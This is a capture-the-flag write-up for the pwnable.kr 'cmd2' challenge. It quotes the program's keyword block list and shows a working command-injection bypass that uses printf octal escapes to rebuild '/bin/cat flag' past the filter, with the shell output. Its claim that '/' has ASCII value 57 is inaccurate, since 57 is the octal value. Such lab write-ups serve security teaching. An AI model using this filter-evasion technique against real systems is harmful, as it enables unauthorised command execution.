# Challenge #13 - cmd2

## Challenge Description:

> Daddy bought me a system command shell.
> but he put some filters to prevent me from playing with it without his permission...
>
>  but I wanna play anytime I want!
>
> ```bash
> ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
> ```

#### As you can see the password for this one is the flag for the cmd1 ctf! (Check my writeup [HERE](../cmd1/README.md))

---

### The setup for this one is very similar to the cmd1 challenge so I will only outline what has changed!

## Static Analysis

Inside `cmd2.c`:
```C
// Inside `filter` function

// ...

r += strstr(cmd, "=")!=0;
r += strstr(cmd, "PATH")!=0;
r += strstr(cmd, "export")!=0;
r += strstr(cmd, "/")!=0;
r += strstr(cmd, "`")!=0;

// ...
```

We see that some more rules were added to the `filter` function, namely:
- `cmd` cannot contain the character `'='`
- `cmd` cannot contain the string `"PATH"`
- `cmd` cannot contain the string `"export"`
- `cmd` cannot contain the character `'/'`
- `cmd` cannot contain the character ```'`'```

## Plan

So the new `filter` breaks our previous exploit as we cant use `'/'` to call `/bin/cat`... Or does it? Since the filter does not check for `'%'` we can "embed" in our argument slashes that will not be caught in the `filter` function but will still run! We can do it like so:

```bash
./program '$(printf "this is a slash! %b" "\57")'
```

The ASCII value for `'/'` is 57 so when parsed by the call to `system()` it will become `printf "this is a slash! /"`!

## Exploit

Let's implement our plan:

```bash
cmd2@ubuntu:~$ ./cmd2 '$(printf "%bbin%bcat %s%s" "\57" "\57" "fl" "ag")'
$(printf "%bbin%bcat %s%s" "\57" "\57" "fl" "ag")
<cmd2_flag_here>
cmd2@ubuntu:~$
```

### And we are successful!
